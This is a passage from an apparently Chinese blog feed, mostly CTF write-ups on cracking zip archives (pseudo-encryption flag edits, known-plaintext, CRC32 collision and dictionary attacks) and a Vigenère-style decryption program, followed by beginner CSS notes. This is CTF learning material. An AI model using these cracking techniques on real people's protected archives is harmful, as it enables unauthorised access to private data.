src="http://img-blog.csdnimg.cn/20190716164053167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>复制下来保存为1.txt文件用notepad++转换一下编码</p><p><img src="http://img-blog.csdnimg.cn/20190716164110673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190716164128327.png" alt="在这里插入图片描述"><br>这就是坐标了,这样来画图吧 转换成gnuplot能识别的格式</p><p><img src="http://img-blog.csdnimg.cn/20190716164141480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="http://img-blog.csdnimg.cn/20190716164156610.png" alt="在这里插入图片描述"><br>保存1.txt文件，下载gnuplot画图工具，把1.txt文件和画图工具放入同一路径，打开gnuplot.exe,输入命令<code>plot &quot;1.txt&quot;</code>进行画图</p><p><img src="http://img-blog.csdnimg.cn/20190716164215707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>扫描二维码，即可得到flag！！</p><p>隐写题总结之后，果然让我对此更加理解了，开心！！！</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> 隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MISC-zip压缩包的总结</title>
      <link href="/2019/04/06/MISC-zip%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E6%80%BB%E7%BB%93/"/>
      <url>/2019/04/06/MISC-zip%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>做了那么多的MISC压缩包的CTF题，是时候总结一下经验了。手撕压缩包走起！</p><h3 id="1、伪加密"><a href="#1、伪加密" class="headerlink" title="1、伪加密"></a>1、伪加密</h3><p>zip中有一位是标记文件是否加密的，如果更改一个未加密zip包的加密标记位，那么在打开压缩包时就会提示该文件是加密的。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvN2JiNmYwNWUyNzBiZGZiZi5wbmc" alt></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvZGRmYTI0ZWFmNDhhYjNlNi5wbmc" alt></p><h5 id="重点部分"><a href="#重点部分" class="headerlink" title="重点部分"></a>重点部分</h5><p>把504B0304后的第3、4个byte改成0000还有<br>把504B0102后的第5、6个byte改成0000即可破解伪加密。</p><h5 id="识别真假加密"><a href="#识别真假加密" class="headerlink" title="识别真假加密"></a>识别真假加密</h5><p><strong><em>无加密</em></strong><br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为00 00<br><strong><em>假加密</em></strong><br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00<br><strong><em>真加密</em></strong><br>压缩源文件数据区的全局加密应当为09 00</p><p>例：</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvOGU2OTVmZTcxYTk4Njk5Yy5wbmc" alt></p><p>根据题目，这可能是一道伪加密题。把压缩包文件用winrar打开，看出来b.png进行了伪加密</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvZWI3YWI4MzNjYWNhYzFlYS5wbmc" alt></p><p>把Blog的zip压缩包放进winhex,在最上面没发现伪加密标志位，所以我在最下面发现</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvOTQzZmNjOTI1ZGI0ZDcxZC5qcGc" alt></p><p>把b.png的504B0102后第五位09改成00，即可破解伪加密，解压即可在b.png中得到flag！！</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvYzQ4ZmQ4NjgzZThmMzU4My5wbmc" alt></p><h3 id="2、明文攻击"><a href="#2、明文攻击" class="headerlink" title="2、明文攻击"></a>2、明文攻击</h3><p>明文攻击是一种较为高效的攻击手段，大致原理是当不知道一个zip的密码，但是有zip中的一个已知文件（文件大小要大于12Byte）时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件。</p><p>推荐一个工具:APCHPR (可进行爆破/明文/字典/掩码攻击)</p><p>例:</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMjA5ZjVkM2U4MDQwNjg4Mi5wbmc" alt></p><p>根据题目看出来这道题可能是明文攻击，下载之后得到zip压缩包，用winrar打开</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvYzg0OWNjMGU5YjFiMjM2Zi5wbmc" alt></p><p>在zip文件里有个<strong>未加密的 提示.txt文件</strong>，在blingbling.zip有个<strong>加密的 提示.txt文件</strong>。所以这应该是明文攻击。把未加密的 <strong>提示.txt文件压缩成zip压缩包</strong> 当作明文。对blingbling.zip进行明文攻击，如下:<img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNDJiMTkwNDU0ODJhNzgwOS5wbmc" alt></p><p>得到<strong>空白文档???</strong>的口令密码:</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvZWE4YjQ5ZDhiZjA4NWE0YS5wbmc" alt></p><p>打开<strong>空白文档???</strong>，发现真的是空白的，想吐血。不过查了查百度发现，打开word文件，选择“选项”，然后选择“显示”</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMDE1MzI1NGIxZmQ4NDNiMy5wbmc" alt></p><p>在<strong>隐藏文字</strong>和<strong>打印隐藏文件</strong>前打对勾，然后确定，然后打开<strong>空白文档???</strong>，就能看到flag了！！</p><h3 id="3、crc32碰撞"><a href="#3、crc32碰撞" class="headerlink" title="3、crc32碰撞"></a>3、crc32碰撞</h3><p>CRC32:CRC本身是“<a href="https://baike.baidu.com/item/CRC32" target="_blank" rel="noopener">冗余校验码</a>”的意思，CRC32则表示会产生一个32bit（8位十六进制数）的校验值。****</p><p>在产生CRC32时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，利用这个原理我们可以直接<em>爆破出加密文件的内容</em></p><p>例:</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvODU2ZWRjYWJhY2Q0OWIwNS5wbmc" alt></p><p>根据题目可知，这道题可能是crc32碰撞。下载该压缩包，用winrar打开</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMDcyZGY2ZWVhNTM2MzVjZC5wbmc" alt></p><p>会发现4个加密的txt文件，有三个大小为6的，一个存放flag大小为102的。<strong>crc32碰撞，碰撞文件的大小一般不大于6，大于6的一般碰撞不出来。且位于同一压缩包的文件，文件密码相同。</strong>所以对1.txt 2.txt 3.txt进行crc32碰撞</p><p><strong><em>还有一款很好用的6位的CRC32爆破</em></strong></p><p>附上神器：<a href="https://github.com/theonlypwner/crc32" target="_blank" rel="noopener">https://github.com/theonlypwner/crc32</a><br>具体使用方法：</p><pre><code class="python">python crc32.py reverse 你的crc32密文</code></pre><p><strong>密文记得加上0x变成16进制</strong>，三个txt文件碰撞结果如下</p><p>1.txt</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvM2IyN2I1ZjJhNzJkOTE2Ni5wbmc" alt></p><p>2.txt</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMjFkZmVlNGExZGU5NGIyZC5wbmc" alt></p><p>3.txt</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvYjk2MjNlYTc0MmQwZTY0MS5wbmc" alt></p><p>在碰撞的内容中，找有意义的字符。1.txt中”<strong>you_ar</strong>“  2.txt中“<strong>e_the_</strong>“  3.txt中未发现有意义的字符。做到这一步，再次想吐血。还好我用notepad++打开碰撞脚本，发现一组特殊之处</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMzI3ZDkzYWJmYTM5MGUxOC5wbmc" alt></p><p>想着是不是因为脚本里缺少特殊字符，而3.txt里有特殊字符。所以碰撞不出3.txt的内容。加上特殊字符后，碰撞结果如下</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvYjhhMWJjZjA4YmZmYmZlOS5wbmc" alt></p><p>找到3.txt中的有意义的字符了，好开心！！！3.txt中的有意义字符“<strong>best!!</strong>”，结合1.txt的“<strong>you_ar</strong>“ 2.txt的”<strong>e_the_</strong>“得到flag.txt的密码：“<strong>you_are_the_best!!</strong>“，输入密码打开后发现</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvZjVjNjM3NzZhODY4MDNmNS5wbmc" alt></p><p>很明显是Base64加密的，所以Base64解密，得到</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvZGMzOTBjODg1MTdjZjNiNS5wbmc" alt></p><p>看起来解密结果符合url编码，所以url解码，得到最终flag如下：</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMmRkZDBiNGQxMGQyMmZkYy5wbmc" alt></p><h3 id="4、爆破-字典-掩码攻击"><a href="#4、爆破-字典-掩码攻击" class="headerlink" title="4、爆破/字典/掩码攻击"></a>4、爆破/字典/掩码攻击</h3><p>把这三种归位一类是因为这三种方法在本质上都是逐个尝试，只不过待选密码的集合不同</p><ol><li><p>爆破：顾名思义，逐个尝试选定集合中可以组成的所有密码，知道遇到正确密码</p></li><li><p>字典：字典攻击的效率比爆破稍高，因为字典中存储了常用的密码，因此就避免了爆破时把时间浪费在脸滚键盘类的密码上</p></li><li><p>掩码攻击：如果已知密码的某几位，如已知6位密码的第3位是a，那么可以构造 ??a??? 进行掩码攻击，掩码攻击的原理相当于构造了第3位为a的字典，因此掩码攻击的效率也比爆破高出不少</p></li></ol><p><strong>例：</strong></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNmVkMDY3MjY5NTRlYTAyZC5wbmc" alt></p><p>用winrar打开发现一个加密文件</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMTcyZTQ0YWEyZjIyYWVhMy5wbmc" alt></p><p>所以应该要暴力破解，把下载的压缩包放进ARCHPR(爆破工具)里，选择字典攻击(字典攻击比暴力攻击用时少)，</p><p>得出文件密码口令</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvOGFkMTAxMjQ2YzFmY2YwMC5wbmc" alt></p><p>输入密码，解压文件，得到一个文件夹。然后文件夹里有好几个文件夹，所以开启找可疑之处的历程</p><p>最终，我发现有个地方比较可疑</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNDMxYWVhN2ZjNzBmNmI5MC5wbmc" alt></p><p>看着比较像Base16加密，所以进行Base16解密，得到flag</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvZmM1OTAwY2NjYzM5Y2U2NC5wbmc" alt></p><h3 id="5、杂类"><a href="#5、杂类" class="headerlink" title="5、杂类"></a>5、杂类</h3><p><strong>例1:</strong></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvOWZhMGY1MjBlOGEyNjE1Yi5wbmc" alt></p><p>很明显，这个题并没有给出有效提示(只给了提交格式)。下载后，用winrar打开发现一个zip.txt文件，打开后</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNzY1NGRhNThiZjQ0MjMzMC5wbmc" alt></p><p>根据504B0304可以看出这应该是一个压缩包的16进制编码，然后查询一下压缩包16进制编码格式，把不符合16进制编码的改成对应的16进制编码。改完后，把16进制编码粘贴在winhex里进行对压缩包的恢复</p><p>注意选择16进制粘贴格式</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvYmY1NWRjYmQ4MjY5MDJhZC5wbmc" alt></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNTZjY2M3ZmQyYjk4NjAxZi5wbmc" alt></p><p>然后保存，用winrar打开恢复后的压缩包，结果发现一个flag.txt文件竟然是加密的，再次想吐血!</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMTFkODRlZDgwZGVmZmUxYi5wbmc" alt></p><p>也没给什么提示，想着是不是伪加密，所以我用winhex打开恢复后的压缩包，发现果然是伪加密</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvOTI4NmMxNTg5Mjk0NjQwYS5wbmc" alt></p><p>把01改成00后保存，再次用winrar打开，发现flag.txt变成了未加密，开心！找到flag了！！</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMmFkZTFkMTYxZDVjYjc5Zi5wbmc" alt></p><p><strong>例2:</strong></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvOTgwNTU0MTYxYmVhZDFjYy5wbmc" alt></p><p>这个题给了提示，一个公式f(x)=(x-n)%26+97，看着有点像凯撒公式。下载后，用winrar打开压缩包，进入“皮”文件夹发现两个txt文件</p><p><img src="http://img-blog.csdnimg.cn/20190801005916302.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt></p><p>打开两个txt文件</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMTQ2ZDVkOGRmY2YzZmYyMy5wbmc" alt></p><p>key.txt应该就是凯撒加密的密文了，而提示.txt可能是密钥。然后，我开始理解题目提示的凯撒公式<strong>f(x)=(x-n)%26+97</strong>，我理解这是个加密公式，<strong><em>f(x)是密钥，x是明文，n是密文</em></strong>。然后我写出对应的解密公式<strong>str=((c1-97)+(key-97))%26+97</strong>，<strong><em>str是明文，c1是密文，key是密钥。</em></strong>由于写这篇blog时，我还不会写python脚本，于是我写了个c语言的</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    int j;    char key[20];    char c1[20]=&quot;yrsimmpzrbkcokd&quot;,c2[20]=&quot;zokkhuapoloaeku&quot;,c3[20]=&quot;xloobshxdbamnqn&quot;,str1[20],str2[20],str3[20];    for(j=1;;j++)    {        printf(&quot;请输入密钥:&quot;);scanf(&quot;%s&quot;,key);        printf(&quot;密文1:%s\n密文2:%s\n密文3:%s\n&quot;,c1,c2,c3);        //printf(&quot;密文1:%s&quot;,c1);//scanf(&quot;%s&quot;,c1);        //printf(&quot;密文2:%s&quot;,c2);//scanf(&quot;%s&quot;,c2);       // printf(&quot;密文3:%s&quot;,c3);//scanf(&quot;%s&quot;,c3);        printf(&quot;明文1:&quot;);        for(int i=0;i&lt;strlen(key);i++)        {            str1[i]=(c1[i]-97+key[i]-97)%26+97;            printf(&quot;%c&quot;,str1[i]);        }        printf(&quot;\n&quot;);        printf(&quot;明文2:&quot;);        for(int i=0;i&lt;strlen(key);i++)        {            str2[i]=(c2[i]-97+key[i]-97)%26+97;            printf(&quot;%c&quot;,str2[i]);        }        printf(&quot;\n&quot;);        printf(&quot;明文3:&quot;);        for(int i=0;i&lt;strlen(key);i++)        {            str3[i]=(c3[i]-97+key[i]-97)%26+97;            printf(&quot;%c&quot;,str3[i]);        }        printf(&quot;\n\n&quot;);        printf(&quot;a  b  c  d  e  f  g  h  i  j  k  l  m  n  o  p  q  r  s  t  u  v  w  x  y  z&quot;);        printf(&quot;\n&quot;);        printf(&quot;1  2  3  4  5  6  7  8  9  10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26&quot;);        printf(&quot;\n&quot;);        printf(&quot;26 25 24 23 22 21 20 19 18 17 16 15 14 13 12 11 10  9  8  7  6  5  4  3  2  1&quot;);        printf(&quot;\n\n&quot;);    }    return 0;}</code></pre><p>输入第一个密钥，运行结果如下</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMGNlMzFlNjA0NTQ1YTFlZi5wbmc" alt></p><p>然后想到明文3前四个字母应该就是f、l、a、g，而密文3前四个字母是x、l、o、o。所以第二个密钥应该是f(x)=(l-l)%26+97=a;</p><p>第三个密钥应该是f(x)=(a-o)%26+97=m;第四个密钥应该是f(x)=(g-o)%26+97=s;</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvYmY0NzNlMmNiOTEzNzNkMy5wbmc" alt></p><p>然后明文1第五个字母应该是t，密文1第五个字母是m。第五个密钥应该是f(x)=(t-m)%26+97=g+1=h; </p><p>注意：</p><p><strong>明文-密文=正值，从前往后数，密钥=正值(即英文字母序号)+1；</strong> </p><p><strong>明文-密文=负值，从后往前数，密钥=负值的绝对值(即26-英文字母序号)；</strong></p><p>找到密钥序号对应的字母</p><p><strong>明文-密文=零，密钥=a；</strong></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMGZkYmQ0ZTY1YzE2Y2QzZS5wbmc" alt></p><p>不断找寻密钥、明文、密文间的规则，最后得出全部密钥和最终flag</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvZmYyYzUwNWE4MWUzOGM3NC5wbmc" alt></p><p>下面也有个别人写好得python脚本，果然写python脚本才更简洁、更容易。我要努力学python了！！</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvOGU2NDc3N2QzNTUyN2VhOC5wbmc" alt></p><p>以上便是我做CTF压缩包类型题的总结，总结许多收获也许多。小白进阶ing!!!</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> ZIP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web前端-CSS篇</title>
      <link href="/2019/03/30/Web%E5%89%8D%E7%AB%AF-CSS%E7%AF%87/"/>
      <url>/2019/03/30/Web%E5%89%8D%E7%AB%AF-CSS%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>学习CSS之后，感觉对Web前端又有了更深一步的理解。学习总结了许久，总算把学习笔记写完了，顿觉一阵轻松！！学习过程中，虽然有些枯燥，但最终的收获却很多很多。下面便是我的CSS的学习笔记，自我认为还行~~</p><h3 id="一、CSS定义和三种用法"><a href="#一、CSS定义和三种用法" class="headerlink" title="一、CSS定义和三种用法"></a>一、CSS定义和三种用法</h3><h4 id="1、CSS-层叠样式表"><a href="#1、CSS-层叠样式表" class="headerlink" title="1、CSS:层叠样式表"></a>1、CSS:层叠样式表</h4><p><strong>负责页面内容的样式</strong></p><p><strong>标签的属性产生的问题：</strong></p><ol><li>浏览器麻烦，需要改很多</li><li>对开发人员：复杂，难维护</li></ol><p><strong>解决方法：</strong></p><ol><li><p>通过标签选择器，样式属性选择标签</p></li><li><p>可复用</p><p>html放标签</p><p>css放样式    </p></li></ol><h4 id="2、CSS三种用法："><a href="#2、CSS三种用法：" class="headerlink" title="2、CSS三种用法："></a>2、CSS三种用法：</h4><h5 id="第一种用法：内联样式"><a href="#第一种用法：内联样式" class="headerlink" title="第一种用法：内联样式"></a>第一种用法：内联样式</h5><p><img src="http://img-blog.csdnimg.cn/20190426231701973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190426231711557.png" alt="在这里插入图片描述"></p><h5 id="第二种用法：内部样式"><a href="#第二种用法：内部样式" class="headerlink" title="第二种用法：内部样式"></a>第二种用法：内部样式</h5><p><img src="http://img-blog.csdnimg.cn/20190426231724943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190426231734151.png" alt="在这里插入图片描述"></p><h5 id="第三种用法：外部样式"><a href="#第三种用法：外部样式" class="headerlink" title="第三种用法：外部样式"></a>第三种用法：外部样式</h5><p><img src="http://img-blog.csdnimg.cn/20190426231749208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190426231758801.png" alt="在这里插入图片描述"></p><h3 id="二、CSS语法"><a href="#二、CSS语法" class="headerlink" title="二、CSS语法"></a>二、CSS语法</h3><h4 id="1、选择器与内容"><a href="#1、选择器与内容" class="headerlink" title="1、选择器与内容"></a>1、选择器与内容</h4><pre><code class="css">/* div:选择器 {}内容：声明 */    /*注释*/div {                        color: yellow;        width: 200px;        height: 200;        background: green;    }</code></pre><h4 id="2、颜色"><a href="#2、颜色" class="headerlink" title="2、颜色"></a>2、颜色</h4><p><strong>1.rgb色彩模式</strong></p><p>R 红色  浅<del>深 0</del>255</p><p>G 绿色</p><p>b 蓝色</p><p><strong>用法一：</strong></p><pre><code class="css">div {                        color: rgb(240,0,0);}</code></pre><p><strong>用法二：</strong></p><pre><code class="css">div {                        color: rgb(100%,20%,0%);}</code></pre><p><strong>2.名称</strong></p><p>red yellow blue red…</p><pre><code class="css">div {                        color: rgb(100%,20%,0%);}</code></pre><p><strong>3.十六进制</strong></p><p>0<del>9 A</del>B</p><p>R 红色  浅<del>深 0</del>255     <strong>225写成ff  (ff即15*15)</strong>   <strong>#ff0000</strong>可以简写成<strong>#f00</strong></p><p>G 绿色</p><p>b 蓝色</p><pre><code class="css">div {                        color: #ff0000;        color: #f00;}</code></pre><h3 id="三、CSS选择器"><a href="#三、CSS选择器" class="headerlink" title="三、CSS选择器"></a>三、CSS选择器</h3><p>大括号{}前的，如：div{} 选择器是div</p><p>作用：通过选择器找到对应的html的元素，并把选择器的样式传给元素</p><p><strong>选择器的分类：</strong></p><p>基本选择器、组合选择器、属性选择器、伪元素选择器</p><h4 id="1、基本选择器"><a href="#1、基本选择器" class="headerlink" title="1、基本选择器"></a>1、基本选择器</h4><p><strong>1、通配符选择器</strong></p><pre><code class="css">*{    border: 1px solid blue        /*给所有元素加个外边框*/}</code></pre><p><strong>2、标签div选择器</strong></p><pre><code class="css">div{    border: 1px solid blue        /*给div标签加个外边框*/}</code></pre><p><strong>3、id选择器</strong></p><pre><code class="css">html中：&lt;div id=&quot;txt&quot;&gt;ppp&lt;/div&gt;#txt{                        /*#txt，*省略/    font-size: 50px;   /*font-size字体大小*/}</code></pre><p><strong>id具有唯一性</strong></p><p><img src="http://img-blog.csdnimg.cn/20190426232005961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="http://img-blog.csdnimg.cn/20190426232017305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>4、class类型选择器</strong></p><pre><code class="html">html中：&lt;div class=&quot;txt txt1&quot;&gt;ppp&lt;/div&gt;</code></pre><pre><code class="css">.txt{                            font-size: 50px;}.txt1{                        /* div.txt1{color: #ff0000;} 作用于div标签下的class=&quot;txt1&quot;    color: #ff0000;}</code></pre><p><strong>class不具有唯一性</strong>    比较常用</p><p><img src="http://img-blog.csdnimg.cn/20190426232027980.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="http://img-blog.csdnimg.cn/20190426232039242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="2、组合选择器"><a href="#2、组合选择器" class="headerlink" title="2、组合选择器"></a>2、组合选择器</h4><p>把基本选择器  通过特殊符号串在一起</p><p><strong>分组选择器</strong></p><pre><code class="html">&lt;div&gt;div1&lt;/div&gt;&lt;p&gt;p1&lt;/p&gt;</code></pre><pre><code class="css">div,p{    background: green;    color: red;}p{            /*相当于background: green;  color: red;*/    font-size: 60px;}</code></pre><p><strong>嵌套选择器</strong></p><p>空格隔开,嵌套在div里面的p才能生效</p><pre><code class="css">div p{    background: green;    color: red;    font-size: 60px;}</code></pre><p><strong>子选择器</strong></p><p>1.父标签必须是div才能生效</p><pre><code class="css">div&gt;p{    background: green;    color: red;    font-size: 60px;}</code></pre><p>2.相邻的 同级别的选择器</p><pre><code class="html">&lt;p&gt;&lt;/p&gt;</code></pre><pre><code class="css">div+p{    background: green;    color: red;    font-size: 60px;}</code></pre><h4 id="3、属性选择器"><a href="#3、属性选择器" class="headerlink" title="3、属性选择器"></a>3、属性选择器</h4><p>基本s[属性]</p><pre><code class="html">&lt;p title=&quot;txt&quot;&gt;p1&lt;/p&gt;</code></pre><pre><code class="css">p[title=txt]{        /*p标签有title属性且值相同的才能生效*/    background: green;    color: red;    font-size: 60px}</code></pre><pre><code class="css">p[title~=txt]{        /*p标签有title属性且值有txt的(且其它字符在html里与txt以空格隔开)才能生效*/    background: green;    color: red;    font-size: 60px}</code></pre><pre><code class="css">p[title^=txt]{        /*p标签有title属性且值以txt开始的才能生效*/    background: green;    color: red;    font-size: 60px}</code></pre><pre><code class="html">&lt;p title=&quot;txt yy&quot;&gt;p1&lt;/p&gt;</code></pre><pre><code class="css">p[title$=yy]{        /*p标签有title属性且值以yy结束的才能生效*/    background: green;    color: red;    font-size: 60px}</code></pre><h4 id="4、伪元素选择器"><a href="#4、伪元素选择器" class="headerlink" title="4、伪元素选择器"></a>4、伪元素选择器</h4><p><strong>伪元素</strong>：自动加的、看不到的元素 如：开始before 结束after</p><pre><code class="html">&lt;p title=&quot;txt&quot;&gt;    &lt;!--&lt;before&gt;--&gt;    p1    &lt;!--&lt;after&gt;--&gt;&lt;/p&gt;</code></pre><pre><code class="css">p::before{    content:&quot;before&quot;; /*content修改内容*/    font-size: 20px;}p::after{    content:&quot;after&quot;; /*content修改内容*/    font-size: 120px;}p {    background: green;    color: red;    font-size: 60px}</code></pre><p>块元素</p><p>第一个字母：<code>first-letter</code></p><p>第一行：<code>first-line</code></p><p><strong><u>伪类 选择器</u></strong></p><p>根据状态来改变</p><h3 id="四、CSS原理"><a href="#四、CSS原理" class="headerlink" title="四、CSS原理"></a>四、CSS原理</h3><h5 id="原则"><a href="#原则" class="headerlink" title="原则"></a>原则</h5><ul><li><p><strong>优先原则</strong>：后解析的覆盖先解析的内容</p></li><li><p><strong>继承原则</strong>：嵌套里面标签拥有外部标签某些样式  子元素可以继承父元素的属性</p><p>​        1.与文字有关的文本、样式可以被继承</p><p>​        2.块级元素，宽度不被设置的  继承父元素的宽   高由内容决定</p></li><li><p><strong>优先原则</strong>：同一个选择器，从上往下执行</p><p>​              同一类型选择器，从上往下执行</p><p>​                  不同类型的选择器，先解析低优先级的，再解析高优先级的 *&lt;div&lt;class&lt;id</p></li><li><p><strong>外部样式和内部样式</strong>:  